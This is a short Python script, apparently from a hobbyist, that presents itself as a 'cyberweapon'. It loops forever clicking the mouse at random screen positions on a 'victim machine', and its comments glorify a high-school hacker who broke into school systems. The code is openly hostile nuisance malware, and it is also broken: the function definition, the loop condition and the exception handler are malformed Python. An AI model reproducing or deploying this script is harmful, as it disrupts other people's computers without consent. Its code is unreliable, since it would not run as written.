# filename: fun.py
# author: K0K0$H@ of GitHub
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# WARNING: DO NOT RUN THIS SCRIPT!!! THIS SCRIPT IS A DANGEROUS CHAOTIC WEAPON!
# Seriously, you should really run this in a VM only, with a saved snapshot.
# An infinite loop of random mouseclicks can mess ANYTHING ON YOUR PC UP!!!!!
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# description: uses pyautogui to simulate random mouseclicks
# As with most of K0K0$H@'s cyberweapons, this python script is cross-OS compatible.
# Victim machine does need pyautogui installed. It may be installed using pip3.
# In the future, I plan to compile all needed libraries right into convenient execs.
# #

## IN HONOR OF ALL THOSE BLACKHATS WHO SHOWED ME THE POWER OF A HACKER AND GAVE IT TO ME
# This program is in honor of a kid I once met once back in high school. This was a long time ago now.
# He showed me just what a hacker is capable of. Hacked right into the school's system as I just watched.
# He got in trouble at some point, but they were too scared to give him more than a suspension. 
# The kid gave me a virus executable at some point. He claimed to not have made it himself. He found it.
# It was named fun.exe and it basically does what this program aims to. Random mouseclicks.
# I'm scared to think what that kid is capable of today as an adult... Probably in Homeland Security. 

import os                               # always import this
import pyautogui                        # mouseclicks and keyboard presses
import random                           # pseudo-random behavior

max_X, max_Y = pyautogui.size()         # max params to randomizer based on screen size

# generates a random integer from 0 to the parameter, and returns this value
def randomizer(max):
    r = random.randint(0, max)
    return r

def fun:
  x = randomizer(max_X)
  y = randomizer(max_Y)
  pyautogui.moveTo(x, y)
  pyautogui.click()
  
while true:  
  try:
    fun()
  Except Exception as E:
    
# TODO
# simulate random keypresses
# attach pyautogui to this program
